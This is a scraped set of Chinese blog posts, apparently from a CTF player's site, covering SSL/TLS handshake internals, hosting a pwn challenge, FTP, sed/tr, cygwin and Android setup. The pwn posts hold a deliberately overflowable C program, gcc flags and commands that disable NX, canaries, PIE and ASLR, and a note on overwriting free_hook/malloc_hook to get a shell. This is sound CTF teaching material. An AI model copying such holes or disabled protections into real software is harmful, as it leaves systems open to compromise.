有文章提出了建立综合状态机来检查SSL链接中消息序列…… 3.1 握手过程中的消息序列ClientHello：ClientHello通常是握手过程中的第一条消息，用于告知服务器客户端所支持的密码套件种类、最高SSL/TLS协议版本以及压缩算法。 ClientHello中还包含一个随机数，这个随机数由4个字节的当前GMT UNIX时间以及28个随机选择的字节组成，共32字节。该随机数会在密钥生成过程中被使用。 另外，ClientHello中还可能包含客户端支持的TLS扩展。(TLS扩展可以被用来丰富TLS协议的功能或者增强协议的安全性) ServerHello：服务器接受到ClientHello后，会返回ServerHello。服务器从客户端在ClientHello中提供的密码套件、SSL/TLS版本、压缩算法列表里选择它所支持的项，并把它的选择包含在ServerHello中告知客户端。接下来SSL协议的建立就基于服务器选择的密码套件类型、SSL/TLS协议版本以及压缩算法。 ServerHello中同样会包含一个随机数，同样4+28 字节类型，由服务器生成。 Certificate：客户端和服务器都可以发送证书消息来证明自己的身份，但是通常客户端证书不被使用。 服务器一般在ServerHello后会接一条Certificate消息，Certificate消息中会包含一条证书链，从服务器证书开始，到Certificate authority(CA)或者最新的自签名证书结束。下图形象地描述了证书链： SSL中使用的证书通常是X.509类型证书，X.509证书的内容如下表所示： 在用的X.509证书包含Version 1和Version 3两种版本，其中v1版本的证书存在安全隐患，同时不支持TLS扩展，被逐渐弃用。现在大多数在用的SSL证书都是V3版本。 同时证书会附带与协商好的密钥交换算法对应的密钥。密钥交换算法以及它们所要求的密钥类型如下表所示。 ServerKeyExchange：该消息仅当以下密钥交换算法被使用时由服务器发出： RSA_EXPORT(仅当服务器的公钥大于512bit时)、DHE_DSS、DHE_DSS_EXPORT、DHE_RSA、DHE_RSA_EXPORT、DH_anon 使用其它密钥交换算法时，服务器不能发送此消息。 ServerkeyExchange消息会携带这些密钥交换算法所需要的额外参数，以在后续步骤中协商PreMasterSecret。这些参数需要被签过名。 CertificateRequest：这个消息通常在要求认证客户端身份时才会有。消息中包含了证书类型以及可接受的CA列表。 ServerHelloDone：服务器发送这条消息表明服务器部分的密钥交换信息已经发送完了，等待客户端的消息以继续接下来的步骤。这条消息只用作提醒，不包含数据域。 ClientKeyExchange：这条消息包含的数据与所选用的密钥交换算法有关。 如果选择的密钥交换算法是RSA，那么消息包含的参数为用服务器RSA公钥(包含在之前证书中的或者是ServerKeyExchange中的)加密过的PreMasterSecret，它有48个字节，前2个字节表示客户端支持的最高协议版本，后46个字节是随机选择的。 如果选择的密钥交换算法是DH或者DHE，则可能有两种情况： 隐式DH公开值：包含在Certificate消息里; 显示DH公开值：公开值是本消息的一部分。 CertificateVerify：这条消息用来证明客户端拥有之前提交的客户端证书的私钥。 Finished：表明握手阶段结束。这是第一条用协商的算法和密钥保护的消息。 因为是用协商好的密钥加密的消息，它可以用来确认已经协商好的密钥。 同时Finished消息包含一个verify_data域，可以用来校验之前发送和接收的信息。 Verify_data域是一个PRF函数的输出(pseudo-random function)。这个伪随机函数的输入为：(1)两个hash值：一个SHA-1，一个MD5，对之前握手过程中交换的所有消息做哈希;(2)the MasterSecret，由预备主密钥生成;(3)finished_label，如果客户端发送的则是”client finished”，服务器发送的则是”server finished”。关于这个PRF的细节在3.3节中会具体描述。 此外，Finished 消息不能够在ChangeCipherSpec前发送。 3.2 不同密钥交换算法对应的握手过程不同的密钥交换算法对应的握手过程中的消息序列是不同的，相应的实现方式也不同，本节介绍几个常见密钥交换算法对应的握手过程。 TLS-RSA：在这个场景下，PreMasterSecret是由客户端指定的，并用RSA公钥加密发送给服务器。服务器不影响PReMasterSecret的生成。 TLS-DH：基于DH的密钥交换也被称为静态Diffie-Hellman。在这种场景下，可能是双方各自提交一个证书包含DH公开值，或者服务器端提交证书包含DH公开值，客户端在每次会话中选择一个值。协商好的DH值被用作PreMasterSecret。显然证书中的参数是固定的，那么每次链接的PreMasterSecret也是相同的。 TLS-DH不能提供前向安全性。 TLS-DHE：基于DHE的TLS握手中会有ServerKeyExchange消息。握手过程中交换参数的认证通过数字签名来实现，支持的签名算法包括RSA和DSS。DH参数会有它的数字签名一起被包含在ServerKeyExchange中被发送出去。客户端在ClientKeyExchange中返回它的公开DH参数，但没有签名保护。同样协商出来的DH密钥被用作PreMasterSecret。 3.3 密钥生成Pseudo-random Function(PRF)：伪随机函数是SSL协议中的一个重要组成部分，它被用来秘密扩展以及生成密钥。在3.1节讲解Finished消息时已经简单提及PRF，在这里我们详细讨论PRF的工作原理。SSL/TLS协议中的PRF如下图所示： 这个PRF基于两个hash函数：MD5和SHA-1，它有3个输入，一个Secret(比如PreMasterSecret)，一个标志符(比如”client finished”, “server finished”)，还有一个种子值(比如客户端随机数+服务器端随机数)。 Secret在使用时被分为长度相同的两半：S1和S2，分别作为P_MD5和P_SHA-1的输入。 PRF的输出按如下方式处理得到： 1PRF( secret , label , seed ) = P_MD5( S1 , label + seed ) XOR P_SHA−1(S2 , label + seed ) ; P_MD5和P_SHA-1都是扩展函数，用来扩展秘密值以用于密钥生成，它们的计算方式如下： 1P_hash (secret , seed) = HMAC_hash(secret , A( 1 ) + seed ) +HMAC hash(secret , A( 2 ) + seed ) +HMAC hash(secret , A( 3 ) + seed ) + . . . 其中A(0) = seed, A(i) = HMAC_hash( secret, A( i −1) ) 这个秘密扩展会一直进行直到得到足够多的扩展数据。 Key Derivation：主密钥(MasterSecret)是利用上述PRF从预备主密钥(PreMasterSecret)生成的。每个MasterSecret为48字节，生成方式如下： 1master_secret = PRF(pre mastersecret, &quot;master secret&quot; , ClientHello.random + ServerHello.random) 得到MasterSecret后，它会被进一步处理最后生成4个不同的密钥和2个初始向量(IV)。处理过程如下： 1key_block = PRF( SecurityParameters.mastersecret , &quot;key expansion&quot; , SecurityParameters.server_random + SecurityParameters.client_random ) ; 处理过程一直持续到足够多的输出被生成，然后把输出分为4个key和2个IV： 12345678910111213client_write_MAC_secret，server_write_MAC_secret, client_write_key, server_write_key, client_write_IV, server_write_IV.Client_MAC = key_block[:MAC_LENGTH*2].decode(&apos;hex&apos;)Server_MAC = key_block[MAC_LENGTH*2:MAC_LENGTH*4].decode(&apos;hex&apos;)Client_KEY = key_block[MAC_LENGTH*4:MAC_LENGTH*4+KEY_LENGTH*2].decode(&apos;hex&apos;)Server_KEY = key_block[MAC_LENGTH*4+KEY_LENGTH*2:MAC_LENGTH*4+KEY_LENGTH*4].decode(&apos;hex&apos;)Client_IV = key_block[MAC_LENGTH*4+KEY_LENGTH*4:MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*2].decode(&apos;hex&apos;)Server_IV = key_block[MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*2:MAC_LENGTH*4+KEY_LENGTH*4+IV_LENGTH*4].decode(&apos;hex&apos;)MAC_LENGTH = 20KEY_LENGTH = 32IV_LENGTH = 16REQ_BYTES = 2*(MAC_LENGTH + KEY_LENGTH + IV_LENGTH) 下图完整阐述了SSL/TLS协议中的密钥生成过程。 四 从SSL到TLS本节介绍SSL/TLS协议的版本变迁，不同版本的区别以及安全特性等。 SSL 1.0由于从来没有被公开过，并且存在严重安全漏洞，我们就不讨论了。 SSL 2.0：SSL 2.0于1995年4月被发布。SSL 2.0中主要存在的问题如下： MAC不能覆盖填充长度域，攻击者可能利用这点破坏消息完整性; 缺乏握手认证，攻击者可以篡改密码套件列表，诱骗通信双方使用较弱的密码套件; 使用较弱的或有问题的密码算法(如MD5，RC4等)，或者使用不安全的分组模式(如CBC模式); 对于不同的密码学基元使用相同的密钥，违背基本安全常识。 由于以上安全问题，RFC 6176已经明确提出避免使用SSL 2.0，但是现实生活中还有少量客户端和服务器支持SSL 2.0. SSL 3.0：SSL 3.0引入了一些新的特性和机制解决了很多之前版本存在的漏洞。此外，SSL 3.0中引入了ChangeCipherSpec子协议。SSL 3.0向后兼容SSL 2.0，相对于SSL 2.0，它的主要改变包括以下几点： 1234567891011支持更多的密码套件(支持更多的密码算法如DSS，SHA-1)在握手阶段支持密钥协商(DH和FORTEZZA)支持密码学参数的重协商增加了消息压缩选项MAC能够覆盖填充长度域了，同时MAC可以使用MD5或者SHA-1不同的密码学基元使用不同的keyAlert子协议能对任何错误给出两种提示：Warning和Fatal中止链接的时候会用一个close_notify警告通知通信双方支持证书链，而非单个证书通过Finished消息认证所有发送和接收的消息加密了的PreMasterSecret包含当前使用的协议版本，防止协议回滚 TLS 1.0：TLS 1.0和SSL 3.0差别非常小。实际上，TLS 1.0是SSL 3.1，在IETF接手后改名为TLS。TLS 1.0版本是目前使用最广泛的SSL/TLS协议版本。 TLS 1.0不再支持使用FORTEZZA的密码套件。 TLS 1.0中MAC被替换成HMAC。 之前提到ChangeCipherSpec消息必须在Finished消息前发送，在TLS 1.0中，如果消息序列不符合这个要求，会产生FATAL警告并终止链接。 TLS 1.1：这个版本相比之前改动也很小。最重要的改动是预防了针对CBC分组模式的一些攻击。现在的填充错误变的和非法MAC错误不可区分了，防止攻击者利用可区分错误响应建立解密预言机对密文进行攻击。 在每次加密过程中，使用CBC分组模式时，都需要显示给出IV，而不用再密钥生成时使用PRF生成IV。 此外，TLS 1.1禁止为适应之前出口限制而使用弱化的密码套件。 TLS 1.2：这是最新的版本，部署的还比较少。这个版本禁用了PRF中的MD5和SHA-1，而用一个可配置的hash函数取代了它们，这样的修改简化了计算过程。修改后的PRF风格如下： 此外，TLS 1.2的一个重要变化是支持认证加密模式(支持GCM等)。但是由于一些AEAD(Authenticated Encryption with Associated Data)密码算法要求IV为隐式的，所以IV又恢复到由MasterSecret生成，即TLS 1.0以前的风格。 TLS 1.2支持使用GCM、CCM的新密码套件。 同时SSL 2.0被宣布放弃，不再向后兼容SSL 2.0. 下图 五 SSL/TLS的流行实现本节简单介绍一下流行的SSL/TLS实现库，SSL协议非常复杂，由开发者自己实现常常会出错，开发者在具体实现SSL协议时通常会依赖于这些密码学库。 5.1 常见的SSL/TLS 实现OpenSSL：这是非常流行的开源SSL/TLS实现。 OpenSSLim完全用C语言实现，支持SSL 2.0/3.0，TLS 1.0/1.1/1.2以及DTLS 1.0。 OpenSSL 近年来出现了很多的安全漏洞，比如2014年曝出的著名的Heartbleed漏洞等。 JSSE：这是使用Java实现的，支持SSL 3.0，TLS 1.0/1.1/1.2. Bouncy Castle：它不仅仅支持SSL/TLS，它是一个完整的密码学库，支持各种密码学算法和协议。不过它仅仅支持TLS 1.0版本。 Android平台主要使用这个密码学库。 GnuTLS：这是另一个用C语言实现的库，支持SSL 3.0，TLS 1.0/1.1/1.2以及DTLS 1.0。主要在Unix世界被使用。同时以各种安全漏洞多而闻名。 NSS：这是最初由网景公司(Netscape)开发的库，支持SSL 2.0/3.0，TLS 1.0/1.1，现在主要被浏览器和客户端软件使用，比如Firefox使用的就是NSS库，Chrome使用的是一个NSS库的修正版。 下表是一些常见软件以及它们所使用的SSL/TLS实现库的情况： 其它还有一些常用的SSL实现库，如cryptlib、CyaSSL、MatrixSSL、PolarSSL等，由于市场占有率不高，我们这里就不多做介绍了。 5.2 流行SSL/TLS实现库的安全研究最近几年曝出的高风险SSL安全漏洞大多跟SSL实现库有关，比如2014年4月曝出的“心脏滴血”漏洞，存在于OpenSSL 1.0.1-1.0.1f版本中，影响全球近17%的Web服务器;同样是2014年曝出的苹果公司iOS 7.0.6版本系统中存在的“gotofail”漏洞，因为程序员的疏忽导致SSL证书校验中的签名校验失效;包括今年曝出的SSL Freak攻击也是由于SSL实现库的安全漏洞导致的攻击，我们研究小组的同学对这个攻击有详细的分析，参见《SSL Freak来袭：如何实施一个具体的SSL Freak攻击》。同时我们还开发了一个基于python的中间人代理攻击框架“风声”对某国内知名电商的服务器进行具体的攻击，并上报了漏洞。 考虑到大量SSL/TLS实现库中存在安全问题，同时这些主流的SSL/TLS实现库对开发者而言使用难度较高，比如有些SSL/TLS实现库要求开发者自己进行随机数生成或密钥管理，让缺乏系统信息安全知识培训的开发者去使用这样高度复杂的密码学库容易产生很多安全问题。我们在这里推荐一些高级密码学库：Google keycazer、NaCl、Cryptlib、GPGME。这些密码学库存在的安全问题较少，同时封装了一些底层的密码学操作，降低了开发者的使用难度。 以上就是本次要介绍的SSL /TLS协议基本知识，后续的文章我们会对一些典型SSL/TLS攻击进行具体介绍。","tags":[{"name":"ssl","slug":"ssl","permalink":"http://yoursite.com/tags/ssl/"}]},{"title":"服务器端题目搭建","date":"2018-03-20T06:59:38.000Z","path":"2018/03/20/服务器端题目搭建/","text":"其实最近做题有一些感触，觉得在自己服务器上搭建题目可能比较关键，常见的需要搭建的题目大概分为三大类：crypto、pwn、web。web搭建比较复杂，运维也很困难，有时候权限问题就会让运维着痛不欲生，而且一般来说做题的时候不太可能会拿到赛题；crypto有些赛题会给出一些代码，然后可以在内部运行，但也有可能不给代码，让你自己琢磨，这些都得靠你自己的思路；pwn题一般会给源码或者可执行文件，所以可以编译之后进行运行。所以本文只讲pwn题的搭建。大家可以触类旁通，搞清楚crypto题的搭建。 1. pwn题搭建1.1 准备题目1234567891011#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main()&#123; char buffer[0x10] = &#123;0&#125;; setvbuf(stdout, NULL, _IOLBF, 0); printf(\"Do your kown what is it : [%p] ?\\n\", buffer); printf(\"Now give me your answer : \\n\"); read(0, buffer, 0x40); return 0;&#125; 1.2 GCC/G++编译命令参数 1.关掉DEP/NX（堆栈不可执行） gcc -z execstack -o level level.c 2.关掉Stack Protector/Canary（栈保护） gcc -fno-stack-protector -o level level.c 3.关掉程序ASLR/PIE（程序随机化保护） gcc -no-pie level level.c 4.关闭整个linux系统的ASLR保护 sudo -secho 0 &gt; /proc/sys/kernel/randomize_va_spaceexit 5.打开整个linux系统的ASLR保护 sudo -secho 2 &gt; /proc/sys/kernel/randomize_va_space 6.64位linux下面的GCC编译出一个32位可执行程序 加参数- m32 gcc -m32 -z execstack -fno-stack-protector -o level level.c 1.3 挂载题目1.使用socat挂载在服务器端口 sudo apt-get install socatsocat tcp-l:端口号,fork exec:程序位置,reuseaddr 2.nohup命令（使得关闭终端也能运行题目程序） 12345678910First.编写脚本pwn.sh#!/bin/sh#name:pwn.shsocat tcp-l:端口号，fork exec:程序位置，reuseaddrNext.运行脚本sudo chmod u+x ./pwn.shnohup ./pwn.sh &amp; 1.4 访问1nc IP地址 端口号","tags":[{"name":"运维","slug":"运维","permalink":"http://yoursite.com/tags/运维/"}]},{"title":"ftp命令的使用方法","date":"2018-03-20T05:35:04.000Z","path":"2018/03/20/ftp命令的使用方法/","text":"ftp服务器在网上较为常见，Linux/windows ftp命令的功能是用命令的方式来控制在本地机和远程机之间传送文件，这里详细介绍Linux/Windows ftp命令的一些经常使用的命令，相信掌握了这些使用Linux/Windows 进行ftp操作将会非常容易。 ftp命令的一般格式$ ftp 主机名/IP 其中“主机名/IP”是所要连接的远程机的主机名或IP地址。在命令行中，主机名属于选项，如果指定主机名，ftp将试图与远程机的ftp服务程序进行连接；如果没有指定主机名，ftp将给出提示符，等待用户输入命令：$ ftpftp &gt;此时在ftp&gt;提示符后面输入open命令加主机名或IP地址，将试图连接指定的主机。不管使用哪一种方法，如果连接成功，需要在远程机上登录。用户如果在远程机上有帐号，就可以通过ftp使用这一帐号并需要提供口令。在远程机上的用户帐号的读写权限决定该用户在远程机上能下载什么文件和将上载文件放到哪个目录中。如果没有远程机的专用登录帐号，许多ftp站点设有可以使用的特殊帐号。这个帐号的登录名为anonymous（也称为匿名ftp），当使用这一帐号时，要求输入email地址作为口令。如果远程系统提供匿名ftp服务，用户使用这项服务可以登录到特殊的，供公开使用的目录。一般专门提供两个目录：pub目录和incoming目录。pub目录包含该站点供公众使用的所有文件，incoming目录存放上载到该站点的文件。一旦用户使用ftp在远程站点上登录成功，将得到“ftp&gt;”提示符。现在可以自由使用ftp提供的命令，可以用 help命令取得可供使用的命令清单，也可以在 help命令后面指定具体的命令名称，获得这条命令的说明。 最常用的命令有ls 列出远程机的当前目录cd 在远程机上改变工作目录lcd 在本地机上改变工作目录ascii 设置文件传输方式为ASCII模式binary 设置文件传输方式为二进制模式close 终止当前的ftp会话hash 每次传输完数据缓冲区中的数据后就显示一个#号get（mget） 从远程机传送指定文件到本地机put（mput） 从本地机传送指定文件到远程机open 连接远程ftp站点断开与远程机的连接并退出ftp? 显示本地帮助信息! 转到Shell中 其它命令◆启动ftp会话open命令用于打开一个与远程主机的会话。该命令的一般格式是：◆open 主机名/IP如果在ftp 会话期间要与一个以上的站点连接，通常只用不带参数的ftp命令。如果在会话期间只想与一台计算机连接，那么在命令行上指定远程主机名或IP地址作为ftp命令的参数。◆终止ftp会话close、disconnect、和bye命令用于终止与远程机的会话。close和disronnect命令关闭与远程机的连接，但是使用户留在本地计算机的ftp程序中。和bye命令都关闭用户与远程机的连接，然后退出用户机上的ftp 程序。◆改变目录“cd [目录]”命令用于在ftp会话期间改变远程机上的目录，lcd命令改变本地目录，使用户能指定查找或放置本地文件的位置。◆远程目录列表ls命令列出远程目录的内容，就像使用一个交互shell中的ls命令一样。ls命令的一般格式是：ls [目录][本地文件]如果指定了目录作为参数，那么ls就列出该目录的内容。如果给出一个本地文件的名字，那么这个目录列表被放入本地机上您指定的这个文件中。◆从远程系统获取文件get和mget命令用于从远程机上获取文件。get命令的一般格式为：get 文件名您还可以给出本地文件名，这个文件名是这个要获取的文件在您的本地机上创建时的文件名。如果您不给出一个本地文件名，那么就使用远程文件原来的名字。mget命令一次获取多个远程文件。mget命令的一般格式为：mget 文件名列表使用用空格分隔的或带通配符的文件名列表来指定要获取的文件，对其中的每个文件都要求用户确认是否传送。◆向远程系统发送文件put和mput命令用于向远程机发送文件。Put命令的一般格式为：put 文件名mput命令一次发送多个本地文件，mput命令的一般格式为：mput 文件名列表使用用空格分隔的或带通配符的文件名列表来指定要发送的文件。对其中的每个文件都要求用户确认是否发送。◆改变文件传输模式默认情况下，ftp按ASCII模式传输文件，用户也可以指定其他模式。ascii和brinary命令的功能是设置传输的模式。用ASCII模式传输文件对纯文本是非常好的，但为避免对二进制文件的破坏，用户可以以二进制模式传输文件。◆检查传输状态传输大型文件时，可能会发现让ftp提供关于传输情况的反馈信息是非常有用的。hash命令使ftp在每次传输完数据缓冲区中的数据后，就在屏幕上打印一个#字符。本命令在发送和接收文件时都可以使用。◆ftp中的本地命令当您使用ftp时，字符“!”用于向本地机上的命令shell传送一个命令。如果用户处在ftp会话中，需要shell做某些事，就很有用。例如用户要建立一个目录来保存接收到的文件。如果输入!mkdir new_dir，那么Linux就在用户当前的本地目录中创建一个名为new_dir 的目录。 这里Linux ftp命令就介绍到这里，应该足够在Linux系统下使用ftp工具了。","tags":[{"name":"ftp","slug":"ftp","permalink":"http://yoursite.com/tags/ftp/"}]},{"title":"pwn的新姿势","date":"2018-03-16T14:47:52.000Z","path":"2018/03/16/pwn的新姿势/","text":"1. 调用malloc的其它常见函数 没有setbuf(stdin,0)的时候，scanf也会malloc个堆作为缓冲区。 没有setbuf(stdout,0)的时候，printf才会调用malloc用来在堆上分配缓冲区。 https://paper.seebug.org/450/ 2. read函数读入指定长度的数据当做pwn题时，经常会遇到read一个长度，但是此时输入长度不够，导致其读入了后续操作的字符串，于是给程序调试带来大量的麻烦！ 解决办法：在每个read函数处后面都加入time.sleep(1~2)，这相当于时间中断！ 另外需要知道的是，scanf其实会产生输入中断。如果前面是read函数，那么此处的scanf函数将会对读入进行中断！ 3. free_hook和malloc_hook其实从名字就可以看出，free_hook是free函数调用时的钩子函数，malloc_hook是malloc函数调用时的钩子函数。如果能够改变free_hook或者malloc_hook为system地址，并布置好其参数“/bin/sh\\0”，那么在调用free或者malloc函数，将会执行system(&quot;/bin/sh&quot;) 那么使用其的场景是什么呢？ 一般是用户有fastbin attack任意地址写，但是找不到对应大小的可用bin块，这时候会选择使用stderr或者stdout或者stdin其地址高位的0x7f，从而在libc中不断使用任意地址写，直到可以改写free_hook或者malloc_hook。 比较经典的是2018_qwb的那道raisepig题！","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"linux中常见指令解释","date":"2018-03-12T16:53:14.000Z","path":"2018/03/13/linux中常见指令解释/","text":"1. sedsed是一个经常被忽视的指令，但是sed使用范围十分广阔，这里介绍其几个简单的使用方法 语法： 1sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件] 参数说明： -e\\&lt;script>或--expression=\\&lt;script> 以选项中指定的script来处理输入的文本文件。 -f\\&lt;script文件>或--file=\\&lt;script文件> 以选项中指定的script文件来处理输入的文本文件。 -h或--help 显示帮助。 -n或--quiet或--silent 仅显示script处理后的结果。 -V或--version 显示版本信息。 动作说明： a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法 范例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758# 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！[root@www ~]# nl /etc/passwd | sed '2,5d'1 root:x:0:0:root:/root:/bin/bash6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown# 在第二行后(亦即是加在第三行)加上『drink tea?』字样[root@www ~]# nl /etc/passwd | sed '2a drink tea'1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologindrink tea3 daemon:x:2:2:daemon:/sbin:/sbin/nologin# 在第二行前[root@www ~]# nl /etc/passwd | sed '2i drink tea'# 要增加两行以上（在第二行后面加入两行字）[root@www ~]# nl /etc/passwd | sed '2a Drink tea or ......\\&gt; drink beer ?'1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologinDrink tea or ......drink beer ?3 daemon:x:2:2:daemon:/sbin:/sbin/nologin# 将第2-5行的内容取代成为『No 2-5 number』[root@www ~]# nl /etc/passwd | sed '2,5c No 2-5 number'1 root:x:0:0:root:/root:/bin/bashNo 2-5 number6 sync:x:5:0:sync:/sbin:/bin/sync# 仅列出 /etc/passwd 文件内的第 5-7 行[root@www ~]# nl /etc/passwd | sed -n '5,7p'5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown# 搜索 /etc/passwd有root关键字的行(所有)[root@www ~]# nl /etc/passwd | sed '/root/p'# 使用-n的时候将只打印包含模板的行nl /etc/passwd | sed -n '/root/p'1 root:x:0:0:root:/root:/bin/bash# 数据的搜寻并删除nl /etc/passwd | sed '/root/d'# 数据的搜寻并执行命令。执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行nl /etc/passwd | sed -n '/bash/&#123;s/bash/blueshell/;p;q&#125;' 1 root:x:0:0:root:/root:/bin/blueshell# 数据的搜寻并替换sed 's/要被取代的字串/新的字串/g'# 多点编辑nl /etc/passwd | sed -e '3,$d' -e 's/bash/blueshell/'1 root:x:0:0:root:/root:/bin/blueshell2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh 2. tr语法 12tr [-cdst][--help][--version][第一字符集][第二字符集] tr [OPTION]…SET1[SET2] 参数说明 -c, --complement：反选设定字符。也就是符合 SET1 的部份不做处理，不符合的剩余部份才进行转换 -d, --delete：删除指令字符 -s, --squeeze-repeats：缩减连续重复的字符成指定的单个字符 -t, --truncate-set1：削减 SET1 指定范围，使之与 SET2 设定长度相等 字符集 \\NNN 八进制值的字符 NNN (1 to 3 为八进制值的字符) \\ 反斜杠 \\a Ctrl-G 铃声 \\b Ctrl-H 退格符 \\f Ctrl-L 走行换页 \\n Ctrl-J 新行 \\r Ctrl-M 回车 \\t Ctrl-I tab键 \\v Ctrl-X 水平制表符 CHAR1-CHAR2 ：字符范围从 CHAR1 到 CHAR2 的指定，范围的指定以 ASCII 码的次序为基础，只能由小到大，不能由大到小。 [CHAR*] ：这是 SET2 专用的设定，功能是重复指定的字符到与 SET1 相同长度为止 [CHAR*REPEAT] ：这也是 SET2 专用的设定，功能是重复指定的字符到设定的 REPEAT 次数为止(REPEAT 的数字采 8 进位制计算，以 0 为开始) [:alnum:] ：所有字母字符与数字 [:alpha:] ：所有字母字符 [:blank:] ：所有水平空格 [:cntrl:] ：所有控制字符 [:digit:] ：所有数字 [\\:graph\\:] ：所有可打印的字符(不包含空格符) [:lower:] ：所有小写字母 [:print:] ：所有可打印的字符(包含空格符) [:punct:] ：所有标点字符 [:space:] ：所有水平与垂直空格符 [:upper:] ：所有大写字母 [:xdigit:] ：所有 16 进位制的数字 [=CHAR=] ：所有符合指定的字符(等号里的 CHAR，代表你可自订的字符)","tags":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/tags/linux/"}]},{"title":"cygwin常见配置","date":"2018-03-12T14:59:53.000Z","path":"2018/03/12/cygwin常见配置/","text":"cygwin作为windows下轻便快捷的linux系统，一直深受用户喜爱！当然，现在不少同学也喜欢用xshell连接虚拟机，这样也挺方便的。唯一的不足就是，开启虚拟机需要耗费不小的内存、cpu，这样会影响性能。所以若有替代虚拟机的办法，我尽量会使用替代方式。 1. cygwin初始安装须知cygwin安装时需要安装一系列初始包，太多初始包会使安装时间过长、安装不稳定，故而经常性导致出错导致重新安装，这样十分浪费时间。所以初始安装包时，尽量只安装必要的软件。 vi、vim、curl、wget、tar、gawk、bzip2、git等 2. cygwin包管理软件apt-cyg1234git clone https://github.com/transcode-open/apt-cyg.gitcd apt-cygcp apt-cyg /bin/chmod +x /bin/apt-cyg 之后安装，都类似于apt-get 我的源地址： http://mirror.rit.edu/cygwin/ 换源：找到/etc/setup/setup.rc中最后几行，将last-mirror中的源换掉 3. 必要的安装环节1234apt-cyg install python2apt-cyg install python3curl https://bootstrap.pypa.io/get-pip.py -o get-pip.pypython get-pip.py 上面环节安装了python以及pip，但是如何知道使用的pip是不是cygwin中的呢？ 12ls /bin/ | grep &quot;pip&quot; #查找/bin/中存在的pip指令，一般会有pip2、pip3which pip # 查看pip使用的是哪个地址，有时候会使用windows环境下的pip 我的环境中只能使用pip2，使用pip时会直接调用windows下的pip指令，导致下载的内容没用放到cygwin中，也即下载之后根本不能用。 4. pip2下载pillow时遇到的问题下载pillow时会提示如下的内容 1Can&apos;t find lcms2.pc in any of /usr/local/lib/pkgconfig /usr/local/share/pkgconfig /usr/lib/pkgconfig /usr/share/pkgconfig use the PKG_CONFIG_PATH environment variable, or specify extra search paths via &apos;search_paths&apos; 总共有以下的文件没被找到： 123456789lcms2.pclibtiff-5.pclibtiff-4.pcfreetype2.pclibimagequant.pclibjpeg.pclibopenjp2.pczlib.pcPython.h 这时使用 1234567apt-cyg install libglib2.0-develapt-cyg install liblcms2-develapt-cyg install libtiff-develapt-cyg install libjpeg-develapt-cyg install libimagequant-develapt-cyg install libopenjp2-develapt-cyg install python2-devel 之后仍未找到Python.h，这是因为全局变量PATH没有修正： 12find / -name &quot;Python.h&quot; # 找到Python.h对应的位置PATH=$PATH:Python.h所在文件夹 最后发现是gcc使用的window中的gcc，而不是cygwin中的gcc（其实没装） 12apt-cyg install gcc-coreapt-cyg install gcc-g++","tags":[{"name":"cygwin","slug":"cygwin","permalink":"http://yoursite.com/tags/cygwin/"}]},{"title":"android逆向准备工作","date":"2018-02-08T07:59:12.000Z","path":"2018/02/08/android逆向准备工作/","text":"0、笔者自述说实话，对于Android逆向，我还只处在开始调试开发的阶段，但是实在是受不了Android中的流氓软件以及流氓事件，我打算进行简单的安卓逆向。刚开始的目标是去除app中的广告页（现在发现十分困难）！ 1、安卓逆向的环境安装1.1 jdk安装jdk安装实在指导很多，但是这儿还是得提醒一句，是jdk的安装，不是jre！ 参考：https://jingyan.baidu.com/article/0202781175839b1bcc9ce529.html 1.2 Android Studio安装貌似现在很多的书籍和网上的提示都是建议用ADT，也即安装Eclipse之后再安装ADT bundle（包含SDK），这中间配置极其麻烦，并且网上很多指导建议都已经过时，毕竟Google已经取消对ADT的支持，只推荐使用Android Studio。如果你们还不死心，那你除了安装上述内容外，还需要安装原生开发包（NDK）。 但是如果你安装Android Studio，这些内容都可以快速配置完毕！其包含SDK_Manager、AVD_Manager等工具。 1.3 模拟器的使用其实我很早就使用Android Studio了，在对比了1.0和现在的3.0版本之后，我发现Android Studio最大的改进就是加快了模拟器的启动速度。这应该会让许许多多的开发者爱上原生态的开发编辑器。现在使用的模拟器最大的问题在于，“窗口标题栏”不见了，没法进行拖拽，没法直接关闭，我真的要疯了！ 所以我在网上搜了好多，最后决定使用Genymotion和夜神模拟器！ 1.3.1 Genymotion的安装与配置Genymotion支持多种版本的手机，所以比较适用于开发。但是，它并不值得夸奖。 不知道你们在安装Genymotion的时候，是否会出现登录错误、下载贼慢等稀奇古怪的问题，这些问题曾耽搁了我半天的时间。当然，最让人头疼的问题是： 问题a：Genymotion基于Virtualbox平台，但是从Genymotion中启动模拟器时出现了&quot;Unable to start the Virtual Device...&quot;错误，最后我锁定的问题是virtualbox版本不太稳定，换了一个，重启了电脑； 问题b：我成功的启动了Genymotion中的模拟器，但是我随便拖个应用进去都安装不上，提示“An error occured while deploying the file. This probably means that the app contains ARM native code and your Genymotion device cannot run ARM instructions. You should either build your native code to x86 or install an ARM translation tool in your device. ”错误，其实这是因为没有Genymotion-ARM-Translation.zip 。这就需要我们打开模拟器，将此zip文件拖入模拟器中，一直点击yes，最后就可用了。 问题c： 